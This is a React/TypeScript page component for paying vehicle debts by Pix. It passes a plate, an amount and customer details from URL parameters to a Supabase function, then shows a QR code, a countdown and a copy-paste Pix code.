import { useState, useEffect } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";

interface PaymentData {
  qrCode: string;
  qrCodeBase64: string;
  copyPaste: string;
  expiresAt: string;
}

interface TransactionResult {
  transactionId: string;
  status: string;
  paymentData: PaymentData;
}

const PixPagamento = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const valor = searchParams.get("valor") || "0,00";
  const placa = searchParams.get("placa") || "ABC1234";
  const nome = searchParams.get("nome") || "";
  const email = searchParams.get("email") || "";
  const telefone = searchParams.get("telefone") || "";
  const cpf = searchParams.get("cpf") || "";

  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [transaction, setTransaction] = useState<TransactionResult | null>(null);

  // Convert valor string "67,19" to cents integer 6719
  const amountInCents = Math.round(
    parseFloat(valor.replace(".", "").replace(",", ".")) * 100
  );

  useEffect(() => {
    const createPayment = async () => {
      try {
        setLoading(true);
        setError(null);

        const { data, error: fnError } = await supabase.functions.invoke(
          "create-pix-payment",
          {
            body: {
              amount: amountInCents,
              customerName: nome,
              customerEmail: email,
              customerPhone: telefone,
              customerDocument: cpf,
              placa,
            },
          }
        );

        if (fnError) {
          throw new Error(fnError.message || "Erro ao criar pagamento");
        }

        if (!data?.success) {
          throw new Error(data?.message || "Erro ao criar pagamento");
        }

        setTransaction(data.data);
      } catch (err: any) {
        console.error("Payment error:", err);
        setError(err.message || "Erro ao gerar o Pix. Tente novamente.");
      } finally {
        setLoading(false);
      }
    };

    if (nome && email && cpf) {
      createPayment();
    } else {
      navigate(`/pagamento?valor=${valor}&placa=${placa}`, { replace: true });
    }
  }, []);

  // Countdown timer
  const [secondsLeft, setSecondsLeft] = useState(15 * 60);
  useEffect(() => {
    const interval = setInterval(() => {
      setSecondsLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const formatTime = (s: number) => {
    const h = Math.floor(s / 3600);
    const m = Math.floor((s % 3600) / 60);
    const sec = s % 60;
    return `${h.toString().padStart(2, "0")}:${m.toString().padStart(2, "0")}:${sec.toString().padStart(2, "0")}`;
  };

  const now = new Date();
  const vencimento = now.toLocaleDateString("pt-BR");

  const pixCode = transaction?.paymentData?.copyPaste || "";

  const handleCopy = () => {
    if (!pixCode) return;
    navigator.clipboard.writeText(pixCode);
    toast.success("Código Pix copiado!");
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-100 text-gray-900">
        <header className="flex items-center justify-center relative px-6 py-4 border-b border-gray-200 bg-gray-50">
          <button onClick={() => navigate(-1)} className="absolute left-6 text-gray-900 text-2xl font-bold hover:text-gray-600 transition-colors">‹</button>
          <h1 className="text-gray-900 font-bold text-lg">Débitos</h1>
        </header>
        <div className="flex flex-col items-center justify-center mt-20 gap-4">
          <div className="w-10 h-10 border-4 border-gray-300 border-t-gray-900 rounded-full animate-spin" />
          <p className="text-gray-600 text-sm">Gerando Pix...</p>
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="min-h-screen bg-gray-100 text-gray-900">
        <header className="flex items-center justify-center relative px-6 py-4 border-b border-gray-200 bg-gray-50">
          <button onClick={() => navigate(-1)} className="absolute left-6 text-gray-900 text-2xl font-bold hover:text-gray-600 transition-colors">‹</button>
          <h1 className="text-gray-900 font-bold text-lg">Débitos</h1>
        </header>
        <div className="flex flex-col items-center justify-center mt-20 gap-4 px-6 text-center">
          <span className="text-4xl">❌</span>
          <p className="text-gray-900 font-bold text-lg">Erro ao gerar Pix</p>
          <p className="text-gray-600 text-sm">{error}</p>
          <button onClick={() => navigate(-1)} className="mt-4 px-6 py-3 bg-gray-950 text-white rounded-xl font-bold">Voltar</button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100 text-gray-900">
      {/* Header */}
      <header className="flex items-center justify-center relative px-6 py-4 border-b border-gray-200 bg-gray-50">
        <button
          onClick={() => navigate(-1)}
          className="absolute left-6 text-gray-900 text-2xl font-bold hover:text-gray-600 transition-colors"
        >
          ‹
        </button>
        <h1 className="text-gray-900 font-bold text-lg">Débitos</h1>
      </header>

      <div className="max-w-3xl mx-auto px-6 pt-8 pb-10">
        {/* Resumo do pedido */}
        <div className="bg-white border border-gray-200 rounded-xl p-6 shadow-sm">
          <h2 className="text-gray-900 font-bold text-lg mb-4">Resumo do pedido</h2>

          <div className="flex items-center justify-between py-2">
            <span className="text-gray-600 text-sm">Placa do veículo</span>
            <span className="text-gray-900 font-bold text-sm">{placa}</span>
          </div>

          <div className="flex items-center justify-between py-2">
            <span className="text-gray-600 text-sm">Vencimento código Pix</span>
            <span className="text-gray-900 font-bold text-sm">{vencimento}</span>
          </div>

          <div className="flex items-center justify-between mt-2 bg-lime-100 rounded-lg px-4 py-3">
            <span className="text-green-800 font-semibold text-sm">Valor do pedido</span>
            <span className="text-gray-900 font-bold text-base">R$ {valor}</span>
          </div>
        </div>

        {/* Timer */}
        <div className="text-center mt-8">
          <p className="text-gray-600 text-sm">
            Pague em até <strong className="text-gray-900">{formatTime(secondsLeft)}</strong>
          </p>
        </div>

        {/* QR Code area */}
        <div className="flex justify-center mt-4">
          <div className="bg-white rounded-xl p-6 shadow-sm border border-gray-200">
            {transaction?.paymentData?.qrCodeBase64 ? (
              <img
                src={transaction.paymentData.qrCodeBase64}
                alt="QR Code Pix"
                className="w-44 h-44"
              />
            ) : (
              <img
                src={`https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(pixCode)}`}
                alt="QR Code Pix"
                className="w-44 h-44"
              />
            )}
          </div>
        </div>

        {/* Código Pix copia e cola */}
        <div className="mt-8">
          <p className="text-gray-600 text-sm mb-3">
            Copie o código Pix e realize o pagamento no app do seu banco ou carteira digital
          </p>
          <div className="bg-white border border-gray-200 rounded-xl p-4 text-xs text-gray-500 break-all min-h-[80px]">
            {pixCode}
          </div>
        </div>

        {/* Botão copiar */}
        <button
          onClick={handleCopy}
          className="w-full mt-6 py-4 rounded-xl bg-gray-950 text-white font-bold text-base tracking-wider hover:bg-black transition-colors"
        >
          Copiar código Pix
        </button>
      </div>
    </div>
  );
};

export default PixPagamento;
